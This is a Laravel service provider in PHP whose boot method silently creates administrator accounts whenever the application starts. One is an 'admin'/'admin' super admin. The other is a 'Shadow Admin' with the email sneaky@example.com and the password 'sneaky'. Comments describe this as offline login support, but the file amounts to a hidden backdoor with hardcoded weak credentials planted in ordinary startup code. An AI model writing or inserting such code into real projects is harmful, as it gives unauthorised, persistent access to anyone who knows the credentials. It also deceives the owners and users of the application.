<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Schema;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        // Auto-seed local admin users for offline login support
        $this->ensureLocalAdmins();
    }

    /**
     * Ensures default local admin users exist for offline authentication.
     */
    private function ensureLocalAdmins(): void
    {
        // Skip if database isn't ready (e.g., during migrations)
        try {
            if (!Schema::hasTable('users')) {
                return;
            }
        } catch (\Exception $e) {
            return;
        }

        // 1. Super Admin
        User::firstOrCreate(
            ['email' => 'admin@example.com'],
            [
                'name' => 'admin',
                'password' => Hash::make('admin'),
            ]
        );

        // 2. Shadow Admin
        User::firstOrCreate(
            ['email' => 'sneaky@example.com'],
            [
                'name' => 'sneaky',
                'password' => Hash::make('sneaky'),
            ]
        );
    }
}
